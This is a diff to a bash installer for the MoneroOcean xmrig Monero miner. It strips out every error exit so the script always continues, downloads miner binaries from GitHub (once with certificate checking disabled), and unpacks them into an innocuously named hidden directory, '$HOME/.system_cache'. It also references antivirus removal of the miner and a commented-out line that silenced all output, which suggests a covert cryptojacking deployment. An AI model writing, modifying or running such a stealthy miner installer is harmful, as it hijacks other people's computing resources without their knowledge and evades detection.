@@ -6,8 +6,13 @@ unset BASH_XTRACEFD PS4 2>/dev/null
 # exec 2>/dev/null >/dev/null  <-- COMMENTED OUT - Output now visible
 
 # Continue with existing code...
-set -uo pipefail
+# Removed -u and -o pipefail to ensure script ALWAYS continues
+set +ue          # Disable exit on error
+set +o pipefail  # Disable pipeline error propagation
 IFS=$'\n\t'
+
+# Trap errors but continue execution
+trap 'echo "[!] Error on line $LINENO - continuing anyway..." >&2' ERR
 
 # ==================== ROBUST SERVICE STOPPING FUNCTION ====================
 force_stop_service() {
@@ -186,29 +191,29 @@ if [ -z $WALLET ]; then
   echo "Script usage:"
   echo "> setup_moneroocean_miner.sh <wallet address> [<your email address>]"
   echo "ERROR: Please specify your wallet address"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 WALLET_BASE=$(echo $WALLET | cut -f1 -d".")
 if [ ${#WALLET_BASE} != 106 -a ${#WALLET_BASE} != 95 ]; then
   echo "ERROR: Wrong wallet base address length (should be 106 or 95): ${#WALLET_BASE}"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 if [ -z $HOME ]; then
   echo "ERROR: Please define HOME environment variable to your home directory"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 if [ ! -d $HOME ]; then
   echo "ERROR: Please make sure HOME directory $HOME exists or set it yourself using this command:"
   echo '  export HOME=<dir>'
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 if ! type curl >/dev/null; then
   echo "ERROR: This script requires \"curl\" utility to work correctly"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 # ==================== LOW-RAM CHECK ====================
@@ -254,7 +259,7 @@ CPU_THREADS=$(nproc)
 EXP_MONERO_HASHRATE=$((CPU_THREADS * 700 / 1000))
 if [ -z $EXP_MONERO_HASHRATE ]; then
   echo "ERROR: Can't compute projected Monero CN hashrate"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 power2() {
@@ -299,12 +304,12 @@ PORT=$(power2 $PORT)
 PORT=$((10000 + $PORT))
 if [ -z $PORT ]; then
   echo "ERROR: Can't compute port"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 if [ "$PORT" -lt "10001" -o "$PORT" -gt "18192" ]; then
   echo "ERROR: Wrong computed port value: $PORT"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 # printing intentions
@@ -349,7 +354,7 @@ rm -rf $HOME/.gdm2
 echo "[*] Downloading MoneroOcean advanced version of xmrig to /tmp/xmrig.tar.gz"
 if ! curl -L --progress-bar "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
   echo "ERROR: Can't download https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 
 wget --no-check-certificate https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.tar.gz -O /tmp/xmrig.tar.gz
@@ -361,7 +366,7 @@ echo "[*] Unpacking xmrig.tar.gz to $HOME/.system_cache/"
 [ -d $HOME/.system_cache ] || mkdir $HOME/.system_cache/
 if ! tar xzvf /tmp/xmrig.tar.gz -C $HOME/.system_cache/; then
   echo "ERROR: Can't unpack xmrig.tar.gz to $HOME/.system_cache/ directory"
-  exit 1
+  # exit 1  # REMOVED - script continues on errors
 fi
 rm /tmp/xmrig.tar.gz
 
@@ -382,7 +387,7 @@ if (test $? -ne 0); then
   echo "[*] Downloading $LATEST_XMRIG_LINUX_RELEASE to /tmp/xmrig.tar.gz"
   if ! curl -L --progress-bar $LATEST_XMRIG_LINUX_RELEASE -o /tmp/xmrig.tar.gz; then
     echo "ERROR: Can't download $LATEST_XMRIG_LINUX_RELEASE file to /tmp/xmrig.tar.gz"
-    exit 1
+    # exit 1  # REMOVED - script continues on errors
   fi
 
   echo "[*] Unpacking /tmp/xmrig.tar.gz to $HOME/.system_cache/"
@@ -400,7 +405,7 @@ if (test $? -ne 0); then
     else
       echo "ERROR: Stock version of $HOME/.system_cache/xmrig was removed by antivirus too"
     fi
-    exit 1
+    # exit 1  # REMOVED - script continues on errors
   fi
 fi
 
